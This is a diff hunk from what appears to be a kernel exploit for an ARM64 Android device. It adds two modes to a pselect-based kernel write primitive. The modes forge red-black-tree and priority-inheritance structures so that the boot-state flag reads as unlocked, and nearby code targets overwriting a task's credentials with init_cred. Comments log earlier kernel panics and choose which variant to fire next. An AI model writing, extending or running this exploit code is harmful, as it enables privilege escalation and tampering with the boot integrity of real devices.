@@ -871,6 +871,69 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     "right=0 left=%016llx (*(fake_fops+0x90)=fake_fops+0x80)\n",
                     (unsigned long long)tree_pc,
                     (unsigned long long)tree_l);
+          } else if (env_flag("MODE4_SLIDE_GBOOT", 0)) {
+            /*
+             * g_boot_state (1-byte .data..ro_after_init) = nonzero.
+             * is_unlocked is LDRB+RET so any nz byte is orange.
+             * VALUE = P0(0x02BB0000)|1 : same zero rb_node as park (change_child
+             * at BSS+8 via parent&~3), stored low byte 1. Z44 proved
+             * 0xffffff8100000000 is live DRAM — do not use it as rb_node.
+             */
+            {
+              uint64_t ztgt = (uint64_t)pselect_write_target();
+              uint64_t it_off =
+                  (active_offsets && active_offsets->off_init_task)
+                      ? (uint64_t)active_offsets->off_init_task
+                      : (uint64_t)INIT_TASK_OFF;
+              uint64_t plain = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                                                   0x02BB0000ULL);
+              tree_pc = plain | 1ULL; /* black: stored byte0=1 */
+              tree_r = 0;
+              tree_l = ztgt;
+              pi_parent = 0;
+              pi_right = 0;
+              pi_left = 0;
+              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE +
+                  (active_offsets && active_offsets->off_bss_tail_lock
+                       ? (uint64_t)active_offsets->off_bss_tail_lock
+                       : 0x02BB9D00ULL));
+              stack_prio = 3;
+              stack_deadline = 0;
+              pr_info("stack mode4 SLIDE_GBOOT *%016llx = %016llx "
+                      "BSS|1 tail lock\n",
+                      (unsigned long long)ztgt, (unsigned long long)tree_pc);
+            }
+          } else if (env_flag("MODE4_SLIDE_KPTR", 0)) {
+            /*
+             * Z44 KP: VALUE 0xffffff8100000000 is live DRAM, not a zero
+             * rb_node. Do not fire this shape again. Prefer SLIDE_GBOOT.
+             */
+            {
+              uint64_t ztgt = (uint64_t)pselect_write_target();
+              uint64_t it_off =
+                  (active_offsets && active_offsets->off_init_task)
+                      ? (uint64_t)active_offsets->off_init_task
+                      : (uint64_t)INIT_TASK_OFF;
+              uint64_t plain = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                                                   0x02BB0000ULL);
+              tree_pc = plain & ~1ULL;
+              tree_r = 0;
+              tree_l = ztgt;
+              pi_parent = 0;
+              pi_right = 0;
+              pi_left = 0;
+              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE +
+                  (active_offsets && active_offsets->off_bss_tail_lock
+                       ? (uint64_t)active_offsets->off_bss_tail_lock
+                       : 0x02BB9D00ULL));
+              stack_prio = 3;
+              stack_deadline = 0;
+              pr_info("stack mode4 SLIDE_KPTR *%016llx = BSS (will NOT zero "
+                      "the int — Z44 DRAM VALUE banned)\n",
+                      (unsigned long long)ztgt);
+            }
           } else if (env_flag("MODE4_SLIDE_CRED", 0)) {
             /*
              * *task.cred = init_cred (or sprayed copy). only-left:
